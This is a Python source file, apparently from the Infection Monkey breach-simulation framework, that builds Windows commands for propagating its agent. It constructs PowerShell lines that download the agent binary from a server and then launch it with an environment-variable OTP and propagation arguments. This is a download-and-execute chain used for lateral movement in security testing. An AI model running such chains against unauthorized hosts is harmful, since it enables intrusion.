from pathlib import PureWindowsPath
from typing import Sequence

from agentpluginapi import (
    DropperExecutionMode,
    IAgentOTPProvider,
    IWindowsAgentCommandBuilder,
    WindowsDownloadMethod,
    WindowsDownloadOptions,
    WindowsRunOptions,
    WindowsShell,
)
from monkeytypes import AgentID

from infection_monkey.utils.commands import build_monkey_commandline_parameters

from .utils import get_agent_argument, get_agent_location


class WindowsAgentCommandBuilder(IWindowsAgentCommandBuilder):
    def __init__(
        self,
        agent_id: AgentID,
        servers: Sequence[str],
        otp_provider: IAgentOTPProvider,
        agent_otp_environment_variable: str,
        current_depth: int = 0,
    ):
        self._agent_id = agent_id
        self._servers = servers
        self._otp_provider = otp_provider
        self._agent_otp_environment_variable = agent_otp_environment_variable
        self._current_depth = current_depth
        self._command = ""

    def build_download_command(self, download_options: WindowsDownloadOptions):
        if download_options.download_method == WindowsDownloadMethod.WEB_REQUEST:
            download_command_func = self._build_download_command_webrequest
        if download_options.download_method == WindowsDownloadMethod.WEB_CLIENT:
            download_command_func = self._build_download_command_webclient

        # We always download using powershell since CMD doesn't have
        # or it is really hard to set a download command
        self._command += "powershell "

        self._command += download_command_func(
            download_options.download_url, download_options.agent_destination_path
        )

    def _build_download_command_webrequest(
        self, download_url: str, destination_path: PureWindowsPath
    ) -> str:
        return (
            f"Invoke-WebRequest -Uri '{download_url}' "
            f"-OutFile '{destination_path}' -UseBasicParsing; "
        )

    def _build_download_command_webclient(
        self, download_url: str, destination_path: PureWindowsPath
    ) -> str:
        return (
            "(new-object System.Net.WebClient)"
            f".DownloadFile(^''{download_url}^'' , ^''{destination_path}^''); "
        )

    def build_run_command(self, run_options: WindowsRunOptions):
        # Note: Downloading a file in Windows is always PowerShell
        # so this is how we switch to CMD for the run command
        if self._command != "":
            if run_options.shell == WindowsShell.CMD:
                self._command += "cmd.exe /c "

        if run_options.shell == WindowsShell.POWERSHELL:
            set_otp = self._set_otp_powershell
        if run_options.shell == WindowsShell.CMD:
            set_otp = self._set_otp_cmd

        self._command += f"{set_otp()} {str(run_options.agent_destination_path)} "

        if run_options.dropper_execution_mode != DropperExecutionMode.SCRIPT:
            self._command += self._build_agent_run_arguments(run_options)

    def _set_otp_powershell(self) -> str:
        return f"$env:{self._agent_otp_environment_variable}='{self._otp_provider.get_otp()}';"

    def _set_otp_cmd(self) -> str:
        return f"set {self._agent_otp_environment_variable}={self._otp_provider.get_otp()}&"

    def _build_agent_run_arguments(self, run_options: WindowsRunOptions) -> str:
        agent_arguments = build_monkey_commandline_parameters(
            parent=self._agent_id,
            servers=self._servers,
            depth=self._current_depth,
            location=get_agent_location(run_options),
        )
        return f"{get_agent_argument(run_options)} {' '.join(agent_arguments)}"

    def get_command(self) -> str:
        return self._command

    def reset_command(self):
        self._command = ""
